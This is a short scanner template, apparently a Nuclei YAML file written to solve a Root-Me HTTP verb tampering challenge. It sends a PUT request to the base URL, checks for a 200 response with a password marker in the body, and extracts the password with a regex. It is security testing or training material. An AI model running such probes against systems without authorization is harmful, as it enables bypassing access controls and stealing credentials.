id: HTTP-VerbTampering

info:
  name: HTTP Verb Tampering
  author: Tomitom13
  severity: unknown
  tags: verb,tampering,http,rootme

requests:
  - method: PUT
    path:
      - "{{BaseURL}}"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        words:
          - "/ password : "
        part: body

    extractors:
      - type: regex
        name: password
        part: body
        regex:
          - "password : [a-zA-Z0-9!@#$%^&*()_+,.<>?]+"
